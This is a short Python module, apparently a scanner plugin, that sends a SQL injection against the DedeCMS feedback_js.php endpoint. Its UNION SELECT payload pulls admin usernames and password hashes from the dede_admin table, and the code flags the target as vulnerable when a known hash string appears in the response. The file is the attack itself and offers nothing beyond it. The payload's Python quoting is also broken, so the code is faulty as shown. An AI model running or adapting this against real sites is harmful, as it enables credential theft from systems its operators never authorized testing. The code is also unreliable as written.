import requests
from termcolor import cprint

class feedback_sqli:

    def __init__(self,url):

        self.url = url

    def feedcheck(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "plus/feedback_js.php?arcurl=' union select "' and 1=2 union select 1,1,1,userid,3,1,3,3,pwd,1,1,3,1,1,1,1,1 from dede_admin where 1=1 union select * from dede_feedback where 1=2 and ''='" from dede_admin where ''='"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:

            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200  and "4beed3b9c4a886067de0e3a094246f78" in r.text:
                cprint("target may be feedback_js.php SqlInject", "red")
        except:
            return False